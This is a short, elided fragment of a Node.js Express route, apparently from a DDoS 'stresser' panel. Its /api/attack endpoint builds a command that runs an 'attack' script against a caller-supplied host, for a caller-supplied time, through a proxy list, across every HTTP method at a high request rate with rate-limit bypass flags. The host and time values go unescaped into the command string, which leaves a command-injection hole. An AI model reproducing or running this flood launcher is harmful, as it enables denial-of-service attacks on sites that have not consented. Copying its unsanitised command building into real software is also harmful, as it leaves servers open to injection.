...
app.get("/api/attack", (req, res) => {
  ...
  const commands = {
    ...
    "attack": `node --max-old-space-size=65536 attack -m GET -m POST -m HEAD -m PUT -m DELETE -m CONNECT -m OPTIONS -m TRACE -m PATCH -m RAND -u ${host} -s ${time} -p live.txt -t 5 -r 333 --ratelimit true --full true`
  };
